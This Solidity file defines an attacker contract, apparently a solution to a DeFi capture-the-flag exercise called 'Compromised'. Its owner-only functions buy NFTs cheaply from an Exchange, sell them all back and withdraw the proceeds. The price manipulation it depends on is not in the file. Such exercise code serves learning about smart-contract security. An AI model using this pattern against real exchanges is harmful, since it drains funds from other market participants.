// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Exchange.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ComprimisedAttacker is IERC721Receiver {
    address private immutable owner;
    uint256[] private tokens;
    Exchange exchange;
    IERC721 nft;
    constructor(address payable exchangeAddress, address nftAddress) {
        owner = msg.sender;
        exchange = Exchange(exchangeAddress);
        nft = IERC721(nftAddress);
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) override external returns (bytes4) {
        tokens.push(tokenId);
        return IERC721Receiver.onERC721Received.selector;
    }

    function buyUp(uint256 amount) external {
        require(msg.sender == owner, "Must be owner");
        uint256 currBal = address(this).balance;
        for (uint256 i = 0; i < amount; i++) {
            exchange.buyOne{value: currBal}();
        }
    }

    function sellAll() external {
        require(msg.sender == owner, "Must be owner");
        for (uint256 i = 0; i < tokens.length; i++) {
            nft.approve(address(exchange), tokens[i]);
            exchange.sellOne(tokens[i]);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Must be owner");
        uint256 currBal = address(this).balance;
        (bool success, ) = owner.call{value: currBal}("");
        require(success);
    }
}